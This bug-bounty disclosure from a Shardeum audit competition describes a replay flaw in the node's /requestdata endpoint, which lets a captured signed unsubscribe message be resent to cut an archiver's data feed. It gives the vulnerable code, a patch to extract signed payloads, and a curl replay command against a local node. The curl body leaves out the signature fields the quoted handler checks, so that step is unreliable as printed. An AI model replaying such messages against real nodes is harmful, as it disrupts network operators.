# #39882 \[BC-Insight] data unsubscribe same node replay

## #39882 \[BC-Insight] Data unsubscribe same node replay

**Submitted on Feb 9th 2025 at 19:28:57 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39882
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/shardeum/shardus-core/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

### Description

## Description

In shardeum network, archive server maintain a websocket connection to nodes for data subscription. This initiatation happen at /reqeustdata endpoint of core. Archiver can also unsubscribe via that endpoint. The problem lies within the endpoint handler's failure to check the unbsubscribe request's intended cycle so that it prevent replays. This mean that somebody can store a unsubscribe request form archiver to nodes and reply it at later time on the node repeatedly essentially resulting in abusive rejection of data subscription for a particular node.

This is the affected area of the code in core repo for its failure to check the cycle of the unsubscribe request

```
  network.registerExternalPost('requestdata', (req, res) => {
    let err = validateTypes(req, { body: 'o' })
    if (err) {
      /* prettier-ignore */ if (logFlags.error) warn(`requestdata: bad req ${err}`)
      res.json({ success: false, error: err })
      return
    }
    err = validateTypes(req.body, {
      tag: 's',
    })
    if (err) {
      /* prettier-ignore */ if (logFlags.error) warn(`requestdata: bad req.body ${err}`)
      res.json({ success: false, error: err })
      return
    }

    const dataRequest = req.body
    if (logFlags.p2pNonFatal) info('dataRequest received', Utils.safeStringify(dataRequest))

    const foundArchiver = archivers.get(dataRequest.publicKey)

    if (!foundArchiver) {
      const archiverNotFoundErr = 'Archiver not found in list'
      /* prettier-ignore */ if (logFlags.error) warn(archiverNotFoundErr)
      res.json({ success: false, error: archiverNotFoundErr })
      return
    }

    const invalidTagErr = 'Tag is invalid'
    const archiverCurvePk = crypto.convertPublicKeyToCurve(foundArchiver.publicKey)
    if (!crypto.authenticate(dataRequest, archiverCurvePk)) {
      /* prettier-ignore */ if (logFlags.error) warn(invalidTagErr)
      res.json({ success: false, error: invalidTagErr })
      return
    }

    /* prettier-ignore */ if (logFlags.p2pNonFatal) info('Tag in data request is valid')
    if (config.p2p.experimentalSnapshot && config.features.archiverDataSubscriptionsUpdate) {
      if (dataRequest.dataRequestType === DataRequestTypes.SUBSCRIBE) {
        // if the archiver is already in the recipients list, remove it first
        if (dataRequest.nodeInfo && recipients.has(dataRequest.nodeInfo.publicKey)) {
          removeArchiverConnection(dataRequest.nodeInfo.publicKey)
          recipients.delete(dataRequest.nodeInfo.publicKey)
        }
        if (recipients.size >= config.p2p.maxArchiversSubscriptionPerNode) {
          const maxArchiversSupportErr = 'Max archivers support reached'
          warn(maxArchiversSupportErr)
          res.json({ success: false, error: maxArchiversSupportErr })
          return
        }
        addDataRecipient(dataRequest.nodeInfo, dataRequest)
      }
      if (dataRequest.dataRequestType === DataRequestTypes.UNSUBSCRIBE) {
        removeDataRecipient(dataRequest.publicKey)
        removeArchiverConnection(dataRequest.publicKey)
      }
      res.json({ success: true })
      return
    }

    delete dataRequest.publicKey
    delete dataRequest.tag

    const dataRequestCycle = dataRequest.dataRequestCycle
    const dataRequestStateMetaData = dataRequest.dataRequestStateMetaData

    const dataRequests = []
    if (dataRequestCycle) {
      dataRequests.push(dataRequestCycle)
    }
    if (dataRequestStateMetaData) {
      dataRequests.push(dataRequestStateMetaData)
    }
    if (dataRequests.length > 0) {
      addDataRecipient(dataRequest.nodeInfo, dataRequests)
    }
    res.json({ success: true })
  })

```

### Proof of Concept

## Proof of Concept

1. Apply this patch to archiver repo to grab the data unsubscribe payload

```diff
diff --git a/src/API.ts b/src/API.ts
index 3427ecd..d787ebc 100644
--- a/src/API.ts
+++ b/src/API.ts
@@ -73,6 +73,25 @@ export function registerRoutes(server: FastifyInstance<Server, IncomingMessage,
     Body: P2P.FirstNodeInfo & Crypto.SignedMessage
   }>

+  server.get('/show_tag', (_request, reply) => {
+    const tags = []
+    for (const [pubkey, node] of Data.dataSenders) {
+      const o = {
+        dataRequestCycle: Cycles.getCurrentCycleCounter(),
+        dataRequestType: Data.DataRequestTypes.UNSUBSCRIBE,
+        publicKey: State.getNodeInfo().publicKey,
+        nodeInfo: State.getNodeInfo(),
+      }
+      const tagged = Crypto.tag(o, pubkey)
+      tags.push({
+        target: node.nodeInfo,
+        payload: tagged,
+      })
+    }
+
+    reply.send(tags)
+  })
+
   server.get('/myip', function (request, reply) {
     const ip = request.raw.socket.remoteAddress
     reply.send({ ip })
```

2. Link the archiver and launch the shardeum network
3. once the network is up. Please call `/show_tag` endpoint to get the unsubscribe payload
4. The payload should looks like this

```json

[
  {
    "payload": {
      "dataRequestCycle": 2,
      "dataRequestType": "UNSUBSCRIBE",
      "nodeInfo": {
        "curvePk": "363afebb8cca474bd4e3c29d0109ad068736b7802c34ed8b7038cd6a95bb1e24",
        "ip": "127.0.0.1",
        "port": 4000,
        "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
      },
      "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3",
      "tag": "48f883791ac4ed062054d1790994278db6d9c10be6a64da8a820164fc7937026cdce88a7df4c84b7f7d82454d37fc80bc58ebca196efa0b7c25300b36edc70cb"
    },
    "target": {
      "id": "e32e966e07a89ed5a7e190b85fd68ff69d878edac7b1aa40ff45d476a8f52cb5",
      "ip": "127.0.0.1",
      "port": 9001,
      "publicKey": "5098f4b148f0918ae7a328b3463df289dea1cadbb194ab2813d22d2701699420"
    }
  }
]
```

5. What the above example shows is that archiver is subscribe to node at port 9001 and intended for cycle 2. but if we used that payload object to inject to the node 9001 even at later cycle, the node terminate the socket connection with the archiver. This is because the node is not checking the cycle of the unsubscribe request.
6. To trigger attack please make a POST request to node x endpoint with the payload object above

```bash
curl -X POST http://0.0.0.0:9001/requestdata -d '{
      "dataRequestCycle": 2,
      "dataRequestType": "UNSUBSCRIBE",
      "nodeInfo": {
        "curvePk": "363afebb8cca474bd4e3c29d0109ad068736b7802c34ed8b7038cd6a95bb1e24",
        "ip": "127.0.0.1",
        "port": 4000,
        "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
      }
    }'
```

7. We can reuse the same payload on same node over and over to make node reject the archiver connection.
8. Please just make sure to replace node ip accordingly

## Impact

This vulnerability allows an attacker to abuse the archiver by replaying the unsubscribe request to the node. This can result in the node rejecting the archiver connection. This can be used to disrupt the data subscription service of the archiver.
